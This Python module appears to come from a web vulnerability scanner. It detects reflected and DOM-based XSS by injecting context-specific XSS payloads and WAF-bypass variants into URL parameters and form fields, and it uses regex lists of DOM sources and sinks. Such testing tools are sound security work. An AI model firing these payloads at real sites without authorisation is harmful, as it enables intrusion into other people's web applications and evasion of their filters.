"""XSS Scanner module — detects reflected, stored, and DOM-based XSS.

FP reduction strategy:
- Canary-based confirmation: inject a unique marker, verify it appears in response before reporting
- Context-aware reflection: classify reflection as html_tag, attribute, js, or url context
- Only report HIGH if payload is reflected in an executable context (inside script, event handler, or unquoted attribute)
- Partially filtered payloads get MEDIUM with lower confidence
- DOM XSS uses source-sink analysis (unchanged)
- Confidence derived from context type and canary confirmation
- Request/response logging: store full HTTP data in findings
"""

import re
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime, timezone
from typing import Optional

from .config import Finding, Severity, FindingType, ScanConfig
from .http_client import HttpClient


def _canary_tag(n: int) -> str:
    """Generate a unique canary string for XSS testing."""
    return f"wbxss{n:04x}"


def _classify_reflection_context(payload: str, response_text: str) -> Optional[str]:
    """Classify the context in which a payload is reflected.

    Returns one of: 'html_tag', 'attribute', 'js', 'url', 'html_encoded', or None.
    """
    if payload not in response_text:
        return None

    # Find the position of the payload in the response
    pos = response_text.find(payload)
    if pos < 0:
        return None

    # Get surrounding context (200 chars before and after)
    start = max(0, pos - 200)
    end = min(len(response_text), pos + len(payload) + 200)
    context = response_text[start:end]

    # Check if we're inside a <script> block
    # Look for <script before the payload and no </script> between <script and payload
    before = response_text[:pos]
    script_opens = len(re.findall(r"<script[\s>]", before, re.IGNORECASE))
    script_closes = len(re.findall(r"</script>", before, re.IGNORECASE))
    if script_opens > script_closes:
        return "js"

    # Check if we're inside an event handler attribute
    # e.g., <div onmouseover="...PAYLOAD...">
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before[-200:], re.IGNORECASE):
        return "js"

    # Check if we're inside a URL attribute (href, src, action, formaction)
    if re.search(r'(?:href|src|action|formaction)\s*=\s*["\'][^"\']*$', before[-200:], re.IGNORECASE):
        return "url"

    # Check if we're inside a tag attribute (but not an event handler)
    # e.g., <input value="...PAYLOAD...">
    if re.search(r'<\w+[^>]*\s\w+\s*=\s*["\'][^"\']*$', before[-200:], re.IGNORECASE):
        # Check if the payload would break out of the attribute
        if '"' in payload or "'" in payload:
            return "attribute"  # Payload breaks out of attribute — dangerous
        return "attribute"  # Still inside attribute, less dangerous but reportable

    # If payload starts with < and creates a new tag
    if payload.strip().startswith("<") and re.search(r'<\w+', payload):
        return "html_tag"

    # Default: reflected in HTML body content
    return "html_body"


def _derive_xss_confidence(context: str, canary_confirmed: bool) -> float:
    """Derive XSS confidence score from context and canary confirmation."""
    base_scores = {
        "html_tag": 0.85,
        "js": 0.90,
        "attribute": 0.75,
        "url": 0.70,
        "html_body": 0.60,
        "html_encoded": 0.40,
    }
    score = base_scores.get(context, 0.50)
    if canary_confirmed:
        score = min(score + 0.10, 0.95)
    return round(score, 2)


# Context-aware XSS payloads
XSS_PAYLOADS = {
    "html_context": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
    ],
    "attribute_context": [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1) autofocus="',
        "' onfocus='alert(1) autofocus='",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
    ],
    "js_context": [
        "';alert(1);//",
        '";alert(1);//',
        "');alert(1);//",
        "');alert(1);//",
        "\\';alert(1);//",
        "-alert(1)-",
    ],
    "url_context": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "javascript:alert(1)//",
    ],
}

# WAF bypass payloads
WAF_BYPASS_PAYLOADS = [
    '<script>alert(1)</script>'.replace(" ", "/**/"),
    '<scr\x00ipt>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
    '<svg/onload=alert(1)>',
    '<img/src=x/onerror=alert(1)>',
    '<script\t>alert(1)</script>',
    '<script\n>alert(1)</script>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert(1)</script' + '>',
    '<<script>alert(1)//<<script>',
    '<script>al\\u0065rt(1)</script>',
    '<script>al&#x65;rt(1)</script>',
    '<script>al&#101;rt(1)</script>',
]

# DOM XSS sinks
DOM_SINKS = [
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"\.insertAdjacentHTML\s*\(",
    r"\.write\s*\(",
    r"\.writeln\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\(\s*[\"']",
    r"setInterval\s*\(\s*[\"']",
    r"location\s*=",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"window\.name",
    r"location\.search",
    r"location\.hash",
]

# DOM XSS sources
DOM_SOURCES = [
    r"location\.search",
    r"location\.hash",
    r"location\.href",
    r"document\.URL",
    r"document\.referrer",
    r"window\.name",
    r"document\.cookie",
]


class XSSScanner:
    """Cross-Site Scripting detection with context-aware FP reduction."""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.client = HttpClient(config)
        self.findings: list[Finding] = []

    def _detect_reflection(self, payload: str, response_text: str) -> Optional[str]:
        """Check if a payload is reflected in the response and classify context."""
        # Direct reflection
        if payload in response_text:
            context = _classify_reflection_context(payload, response_text)
            return context or "html_body"

        # URL-decoded reflection (server may decode entities)
        decoded = payload.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
        if decoded != payload and decoded in response_text:
            return "partially_filtered"

        # HTML-entity encoded but still in a dangerous context
        if payload.replace("<", "&lt;").replace(">", "&gt;") in response_text:
            return "html_encoded"

        return None

    def _detect_dom_xss(self, js_code: str) -> list[dict]:
        """Analyze JavaScript for DOM XSS patterns."""
        results = []
        sources_found = []
        sinks_found = []

        for source_pattern in DOM_SOURCES:
            if re.search(source_pattern, js_code):
                sources_found.append(source_pattern)

        for sink_pattern in DOM_SINKS:
            if re.search(sink_pattern, js_code):
                sinks_found.append(sink_pattern)

        if sources_found and sinks_found:
            results.append({
                "sources": sources_found,
                "sinks": sinks_found,
                "risk": "HIGH" if len(sinks_found) > 1 else "MEDIUM",
            })

        return results

    async def _inject_canary(self, url: str, param: str, method: str) -> tuple[bool, str]:
        """Inject a unique canary to verify parameter is reflected."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        canary = _canary_tag(hash(f"{url}:{param}") % 65536)

        if method == "GET":
            tp = dict(params_dict)
            tp[param] = [canary]
            test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
            resp = await self.client.get(test_url)
        else:
            resp = await self.client.post(url, data={param: canary})

        if resp and canary in resp.text:
            return True, canary
        return False, canary

    async def scan_param(self, url: str, param: str, method: str = "GET") -> list[Finding]:
        """Test a parameter for XSS vulnerabilities with FP reduction."""
        findings = []
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        # Step 0: Canary injection to confirm parameter is reflected
        canary_confirmed, canary_value = await self._inject_canary(url, param, method)

        for context, payloads in XSS_PAYLOADS.items():
            for payload in payloads:
                # Create unique marker to detect exact reflection
                marker = f"wb{hashlib.md5(payload.encode()).hexdigest()[:8]}"
                if "alert(1)" in payload:
                    marked_payload = payload.replace("alert(1)", f"alert({marker})")
                elif payload.strip().startswith("<"):
                    marked_payload = payload + f"<!--{marker}-->"
                else:
                    marked_payload = payload + f"/*{marker}*/"

                if method == "GET":
                    test_params = dict(params_dict)
                    test_params[param] = [marked_payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: marked_payload})

                if not resp:
                    continue

                # Check for the original payload (not marked) to verify actual reflection
                reflection_context = self._detect_reflection(payload, resp.text)

                if reflection_context and reflection_context not in ("html_encoded", "partially_filtered"):
                    # Determine severity based on context
                    if reflection_context in ("html_tag", "js"):
                        severity = Severity.HIGH
                    elif reflection_context in ("attribute", "url"):
                        severity = Severity.MEDIUM
                    else:
                        severity = Severity.MEDIUM

                    confidence = _derive_xss_confidence(reflection_context, canary_confirmed)

                    findings.append(Finding(
                        finding_type=FindingType.XSS,
                        severity=severity,
                        url=url, parameter=param, payload=payload,
                        evidence=f"[{context}] Payload reflected in {reflection_context} context" + (" (canary confirmed)" if canary_confirmed else ""),
                        request=test_url if method == "GET" else f"POST {url} {param}={marked_payload[:100]}",
                        response=resp.text[:500],
                        remediation="Encode output with context-appropriate encoding. Implement CSP headers.",
                        confidence=confidence,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break  # Found for this context, move to next

                elif reflection_context == "partially_filtered":
                    confidence = _derive_xss_confidence("partially_filtered", canary_confirmed)
                    findings.append(Finding(
                        finding_type=FindingType.XSS,
                        severity=Severity.MEDIUM,
                        url=url, parameter=param, payload=payload,
                        evidence=f"[{context}] Payload partially filtered — may bypass with encoding" + (" (canary confirmed)" if canary_confirmed else ""),
                        request=test_url if method == "GET" else f"POST {url} {param}={marked_payload[:100]}",
                        response=resp.text[:500],
                        remediation="Improve output encoding. Add CSP as defense-in-depth.",
                        confidence=confidence,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))

            if any(f.severity == Severity.HIGH for f in findings):
                break  # High severity found, skip remaining contexts

        # WAF bypass attempts if no high findings
        if not any(f.severity == Severity.HIGH for f in findings):
            for payload in WAF_BYPASS_PAYLOADS[:5]:
                marker = f"wb{hash(payload) % 99999}"
                if method == "GET":
                    test_params = dict(params_dict)
                    test_params[param] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: payload})

                if resp:
                    reflection_context = self._detect_reflection(payload, resp.text)
                    if reflection_context and reflection_context not in ("html_encoded", "partially_filtered"):
                        confidence = _derive_xss_confidence(reflection_context, canary_confirmed)
                        findings.append(Finding(
                            finding_type=FindingType.XSS,
                            severity=Severity.HIGH,
                            url=url, parameter=param, payload=f"[WAF bypass] {payload}",
                            evidence=f"WAF bypass: payload reflected in {reflection_context} context" + (" (canary confirmed)" if canary_confirmed else ""),
                            request=test_url if method == "GET" else f"POST {url} {param}={payload[:100]}",
                            response=resp.text[:500],
                            remediation="Fix the underlying XSS AND review WAF rules. CSP as defense-in-depth.",
                            confidence=confidence,
                            timestamp=datetime.now(timezone.utc).isoformat(),
                        ))
                        break

        return findings

    async def scan_dom(self, url: str) -> list[Finding]:
        """Analyze JavaScript files for DOM-based XSS patterns."""
        findings = []
        resp = await self.client.get(url)
        if not resp:
            return findings

        # Extract JS files
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(resp.text, "lxml")
        js_urls = []
        for script in soup.find_all("script", src=True):
            from urllib.parse import urljoin
            js_urls.append(urljoin(url, script["src"]))

        # Also check inline scripts
        inline_scripts = []
        for script in soup.find_all("script"):
            if script.string:
                inline_scripts.append(script.string)

        # Analyze inline scripts
        for js in inline_scripts:
            dom_results = self._detect_dom_xss(js)
            for result in dom_results:
                severity_str = result["risk"]
                severity = {
                    "HIGH": Severity.HIGH,
                    "MEDIUM": Severity.MEDIUM,
                }.get(severity_str, Severity.MEDIUM)
                findings.append(Finding(
                    finding_type=FindingType.XSS,
                    severity=severity,
                    url=url, parameter="[inline JS]", payload="DOM XSS",
                    evidence=f"Sources: {result['sources']}, Sinks: {result['sinks']}",
                    remediation="Sanitize DOM sources before passing to sinks. Use safe APIs like textContent.",
                    confidence=0.7,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))

        # Analyze external JS files
        for js_url in js_urls:
            js_resp = await self.client.get(js_url)
            if js_resp:
                dom_results = self._detect_dom_xss(js_resp.text)
                for result in dom_results:
                    js_severity = Severity.HIGH if result["risk"] == "HIGH" else Severity.MEDIUM
                    findings.append(Finding(
                        finding_type=FindingType.XSS,
                        severity=js_severity,
                        url=js_url, parameter="[external JS]", payload="DOM XSS",
                        evidence=f"Sources: {result['sources']}, Sinks: {result['sinks']}",
                        remediation="Sanitize DOM sources before passing to sinks. Review JS dependencies.",
                        confidence=0.65,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))

        return findings

    async def scan_url(self, url: str, params: list[dict] = None) -> list[Finding]:
        """Scan all parameters + DOM for XSS."""
        all_findings = []
        # Param-based XSS
        if params:
            for p in params:
                findings = await self.scan_param(url, p["name"])
                all_findings.extend(findings)
        else:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query).keys():
                findings = await self.scan_param(url, param_name)
                all_findings.extend(findings)

        # DOM-based XSS
        dom_findings = await self.scan_dom(url)
        all_findings.extend(dom_findings)

        return all_findings

    async def scan_forms(self, forms: list[dict]) -> list[Finding]:
        """Test form fields for XSS."""
        all_findings = []
        for form in forms:
            for field in form["fields"]:
                if field["type"] in ("hidden", "submit", "button"):
                    continue
                findings = await self.scan_param(form["action"], field["name"], method=form["method"])
                all_findings.extend(findings)
        return all_findings

    async def close(self):
        await self.client.close()